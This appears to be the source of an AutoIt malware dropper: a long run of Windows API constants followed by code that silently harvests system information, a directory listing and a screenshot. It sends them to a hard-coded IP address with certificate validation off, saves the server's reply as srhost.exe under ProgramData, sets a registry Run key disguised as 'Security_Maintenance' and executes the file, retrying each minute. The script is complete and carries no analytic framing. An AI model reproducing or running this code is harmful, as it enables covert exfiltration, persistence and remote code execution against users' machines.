Global Const $dt_bottom = 8
Global Const $dt_calcrect = 1024
Global Const $dt_center = 1
Global Const $dt_editcontrol = 8192
Global Const $dt_end_ellipsis = 32768
Global Const $dt_expandtabs = 64
Global Const $dt_externalleading = 512
Global Const $dt_hideprefix = 1048576
Global Const $dt_internal = 4096
Global Const $dt_left = 0
Global Const $dt_modifystring = 65536
Global Const $dt_noclip = 256
Global Const $dt_nofullwidthcharbreak = 524288
Global Const $dt_noprefix = 2048
Global Const $dt_path_ellipsis = 16384
Global Const $dt_prefixonly = 2097152
Global Const $dt_right = 2
Global Const $dt_rtlreading = 131072
Global Const $dt_singleline = 32
Global Const $dt_tabstop = 128
Global Const $dt_top = 0
Global Const $dt_vcenter = 4
Global Const $dt_wordbreak = 16
Global Const $dt_word_ellipsis = 262144
Global Const $rdw_erase = 4
Global Const $rdw_frame = 1024
Global Const $rdw_internalpaint = 2
Global Const $rdw_invalidate = 1
Global Const $rdw_noerase = 32
Global Const $rdw_noframe = 2048
Global Const $rdw_nointernalpaint = 16
Global Const $rdw_validate = 8
Global Const $rdw_erasenow = 512
Global Const $rdw_updatenow = 256
Global Const $rdw_allchildren = 128
Global Const $rdw_nochildren = 64
Global Const $wm_renderformat = 773
Global Const $wm_renderallformats = 774
Global Const $wm_destroyclipboard = 775
Global Const $wm_drawclipboard = 776
Global Const $wm_paintclipboard = 777
Global Const $wm_vscrollclipboard = 778
Global Const $wm_sizeclipboard = 779
Global Const $wm_askcbformatname = 780
Global Const $wm_changecbchain = 781
Global Const $wm_hscrollclipboard = 782
Global Const $hterror = -2
Global Const $httransparent = -1
Global Const $htnowhere = 0
Global Const $htclient = 1
Global Const $htcaption = 2
Global Const $htsysmenu = 3
Global Const $htgrowbox = 4
Global Const $htsize = $htgrowbox
Global Const $htmenu = 5
Global Const $hthscroll = 6
Global Const $htvscroll = 7
Global Const $htminbutton = 8
Global Const $htmaxbutton = 9
Global Const $htleft = 10
Global Const $htright = 11
Global Const $httop = 12
Global Const $httopleft = 13
Global Const $httopright = 14
Global Const $htbottom = 15
Global Const $htbottomleft = 16
Global Const $htbottomright = 17
Global Const $htborder = 18
Global Const $htreduce = $htminbutton
Global Const $htzoom = $htmaxbutton
Global Const $htsizefirst = $htleft
Global Const $htsizelast = $htbottomright
Global Const $htobject = 19
Global Const $htclose = 20
Global Const $hthelp = 21
Global Const $color_scrollbar = 0
Global Const $color_background = 1
Global Const $color_activecaption = 2
Global Const $color_inactivecaption = 3
Global Const $color_menu = 4
Global Const $color_window = 5
Global Const $color_windowframe = 6
Global Const $color_menutext = 7
Global Const $color_windowtext = 8
Global Const $color_captiontext = 9
Global Const $color_activeborder = 10
Global Const $color_inactiveborder = 11
Global Const $color_appworkspace = 12
Global Const $color_highlight = 13
Global Const $color_highlighttext = 14
Global Const $color_btnface = 15
Global Const $color_btnshadow = 16
Global Const $color_graytext = 17
Global Const $color_btntext = 18
Global Const $color_inactivecaptiontext = 19
Global Const $color_btnhighlight = 20
Global Const $color_3ddkshadow = 21
Global Const $color_3dlight = 22
Global Const $color_infotext = 23
Global Const $color_infobk = 24
Global Const $color_hotlight = 26
Global Const $color_gradientactivecaption = 27
Global Const $color_gradientinactivecaption = 28
Global Const $color_menuhilight = 29
Global Const $color_menubar = 30
Global Const $color_desktop = 1
Global Const $color_3dface = 15
Global Const $color_3dshadow = 16
Global Const $color_3dhighlight = 20
Global Const $color_3dhilight = 20
Global Const $color_btnhilight = 20
Global Const $hinst_commctrl = -1
Global Const $idb_std_small_color = 0
Global Const $idb_std_large_color = 1
Global Const $idb_view_small_color = 4
Global Const $idb_view_large_color = 5
Global Const $idb_hist_small_color = 8
Global Const $idb_hist_large_color = 9
Global Const $startf_forceofffeedback = 128
Global Const $startf_forceonfeedback = 64
Global Const $startf_preventpinning = 8192
Global Const $startf_runfullscreen = 32
Global Const $startf_titleisappid = 4096
Global Const $startf_titleislinkname = 2048
Global Const $startf_usecountchars = 8
Global Const $startf_usefillattribute = 16
Global Const $startf_usehotkey = 512
Global Const $startf_useposition = 4
Global Const $startf_useshowwindow = 1
Global Const $startf_usesize = 2
Global Const $startf_usestdhandles = 256
Global Const $cdds_prepaint = 1
Global Const $cdds_postpaint = 2
Global Const $cdds_preerase = 3
Global Const $cdds_posterase = 4
Global Const $cdds_item = 65536
Global Const $cdds_itemprepaint = 65537
Global Const $cdds_itempostpaint = 65538
Global Const $cdds_itempreerase = 65539
Global Const $cdds_itemposterase = 65540
Global Const $cdds_subitem = 131072
Global Const $cdis_selected = 1
Global Const $cdis_grayed = 2
Global Const $cdis_disabled = 4
Global Const $cdis_checked = 8
Global Const $cdis_focus = 16
Global Const $cdis_default = 32
Global Const $cdis_hot = 64
Global Const $cdis_marked = 128
Global Const $cdis_indeterminate = 256
Global Const $cdis_showkeyboardcues = 512
Global Const $cdis_nearhot = 1024
Global Const $cdis_othersidehot = 2048
Global Const $cdis_drophilited = 4096
Global Const $cdrf_dodefault = 0
Global Const $cdrf_newfont = 2
Global Const $cdrf_skipdefault = 4
Global Const $cdrf_notifypostpaint = 16
Global Const $cdrf_notifyitemdraw = 32
Global Const $cdrf_notifysubitemdraw = 32
Global Const $cdrf_notifyposterase = 64
Global Const $cdrf_doerase = 8
Global Const $cdrf_skippostpaint = 256
Global Const $gui_ss_default_gui = BitOR($ws_minimizebox, $ws_caption, $ws_popup, $ws_sysmenu)
Opt("trayiconhide", 1)
$uri = "locale/protocol/volume.php"
$host = "https://185.236.203.53/"
$call = True
$fp = "c:\ProgramData\Windows\Microsoft\Settings\srhost.exe"
$copybaras = ""
$argv = argv()
main()

Func base64($vcode, $bencode = True, $burl = False)
	Local $odm = ObjCreate("Microsoft.XMLDOM")
	If NOT IsObj($odm) Then Return SetError(1, 0, 1)
	Local $oel = $odm.createelement("Tmp")
	$oel.datatype = "bin.base64"
	If $bencode Then
		$oel.nodetypedvalue = Binary($vcode)
		If NOT $burl Then Return $oel.text
		Return StringReplace(StringReplace(StringReplace($oel.text, "+", "-"), "/", "_"), @LF, "")
	Else
		If $burl Then $vcode = StringReplace(StringReplace($vcode, "-", "+"), "_", "/")
		$oel.text = $vcode
		Return $oel.nodetypedvalue
	EndIf
EndFunc

Func scr()
	_screencapture_capture(@TempDir & "\tmp.jpg")
	If @error <> 0 Then $call = True
	$f = FileOpen(@TempDir & "\tmp.jpg", 16)
	$dt = FileRead($f)
	FileClose($f)
	FileDelete(@TempDir & "\tmp.jpg")
	Return $dt
EndFunc

Func argv()
	$id = ""
	For $i = 0 To 31
		$id = $id & Chr(Random(65, 90, 1))
	Next
	Return $id
EndFunc

Func info()
	Dim $aosinfo
	_computergetoss($aosinfo)
	$a = @ScriptFullPath & @CRLF
	$a = $a & $aosinfo[1][0] & @CRLF
	$a = $a & $aosinfo[1][5] & @CRLF
	$a = $a & $aosinfo[1][7] & @CRLF
	$a = $a & $aosinfo[1][10] & @CRLF
	$a = $a & $aosinfo[1][23] & @CRLF
	$a = $a & $aosinfo[1][25] & @CRLF
	$a = $a & $aosinfo[1][26] & @CRLF
	$a = $a & $aosinfo[1][45] & @CRLF
	$a = $a & $aosinfo[1][46] & @CRLF
	$a = $a & $aosinfo[1][54] & @CRLF
	$a = $a & $argv & @CRLF
	$a = $a & @AppDataDir & @CRLF
	Local $spid = Run(@ComSpec & " /C DIR C:\", "", @SW_HIDE, 2)
	ProcessWaitClose($spid)
	Local $soutput = StdoutRead($spid)
	$a = $a & $soutput
	Return $a
EndFunc

Func winhttpsimplesendsslrequest($hconnect, $stype = Default, $spath = Default, $sreferrer = Default, $sdta = Default, $sheader = Default, $iignoreallcerterrors = 0)
	__winhttpdefault($stype, "GET")
	__winhttpdefault($spath, "")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($sdta, $winhttp_no_request_data)
	__winhttpdefault($sheader, $winhttp_no_additional_headers)
	Local $hrequest = _winhttpopenrequest($hconnect, $stype, $spath, Default, $sreferrer, Default, BitOR($winhttp_flag_secure, $winhttp_flag_escape_disable))
	If NOT $hrequest Then Return SetError(1, @error, 0)
	_winhttpsetoption($hrequest, $winhttp_option_security_flags, BitOR($security_flag_ignore_unknown_ca, $security_flag_ignore_cert_date_invalid, $security_flag_ignore_cert_cn_invalid, $security_flag_ignore_cert_wrong_usage))
	If $stype = "POST" AND $sheader = $winhttp_no_additional_headers Then $sheader = "Content-Type: application/x-www-form-urlencoded" & @CRLF
	_winhttpsetoption($hrequest, $winhttp_option_decompression, $winhttp_decompression_flag_all)
	_winhttpsetoption($hrequest, $winhttp_option_unsafe_header_parsing, 1)
	_winhttpsendrequest($hrequest, $sheader, $sdta)
	If @error Then Return SetError(2, 0 * _winhttpclosehandle($hrequest), 0)
	_winhttpreceiveresponse($hrequest)
	If @error Then Return SetError(3, 0 * _winhttpclosehandle($hrequest), 0)
	Return $hrequest
EndFunc

Func winhttpsimplesslrequest($hconnect, $stype = Default, $spath = Default, $sreferrer = Default, $sdta = Default, $sheader = Default, $fgetheaders = Default, $imode = Default, $scredname = Default, $scredpass = Default, $iignorecerterrors = 0)
	__winhttpdefault($stype, "GET")
	__winhttpdefault($spath, "")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($sdta, $winhttp_no_request_data)
	__winhttpdefault($sheader, $winhttp_no_additional_headers)
	__winhttpdefault($fgetheaders, False)
	__winhttpdefault($imode, Default)
	__winhttpdefault($scredname, "")
	__winhttpdefault($scredpass, "")
	If $imode > 2 OR $imode < 0 Then Return SetError(4, 0, 0)
	Local $hrequest = winhttpsimplesendsslrequest($hconnect, $stype, $spath, $sreferrer, $sdta, $sheader, $iignorecerterrors)
	If @error Then Return SetError(@error, 0, 0)
	__winhttpsetcredentials($hrequest, $sheader, $sdta, $scredname, $scredpass)
	If $fgetheaders Then
		Local $adata[3] = [_winhttpqueryheaders($hrequest), _winhttpsimplereaddata($hrequest, $imode), _winhttpqueryoption($hrequest, $winhttp_option_url)]
		_winhttpclosehandle($hrequest)
		Return $adata
	EndIf
	Local $soutdata = _winhttpsimplereaddata($hrequest, $imode)
	_winhttpclosehandle($hrequest)
	Return $soutdata
EndFunc

Func connect($postdata, $fo)
	Global $hopen = _winhttpopen("-")
	Global $hconnect = _winhttpconnect($hopen, $host)
	Global $sreturned = winhttpsimplesslrequest($hconnect, "POST", $uri, Default, $postdata, Default, Default, Default, Default, Default, 1)
	_winhttpclosehandle($hconnect)
	_winhttpclosehandle($hopen)
	If $sreturned = 0 Then $call = True
	$data = base64($sreturned, False)
	parseresponse($data)
	$err = FileWrite($fo, $copybaras)
EndFunc

Func parseresponse($resp)
	$copybaras = $resp
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Security_Maintenance", "REG_SZ", $fp & " " & $argv)
EndFunc

Func crocodile($ap)
	FileClose($ap)
	If FileGetSize($fp) > 50000 Then
		$cr = ShellExecute($fp, $argv)
		If $cr = 0 Then
			$call = True
		Else
			$call = False
		EndIf
	Else
		$call = True
	EndIf
EndFunc

Func main()
	While $call
		$fo = FileOpen($fp, 2 + 8 + 16)
		$si = StringReplace(base64(info()), "\r\n", "")
		$sc = StringReplace(base64(scr()), "\r\n", "")
		If $si = "" Then Exit
		If $sc = "" Then Exit
		$coun = STRINGREVERSE(StringLen($si))
		For $k = StringLen($coun) To 5
			$coun = $coun & "F"
		Next
		$coun = "img=" & $coun & $si & $sc
		connect($coun, $fo)
		$ap = $fo
		crocodile($ap)
		If $call Then
			Sleep(60000)
		Else
			ExitLoop
		EndIf
	WEnd
EndFunc
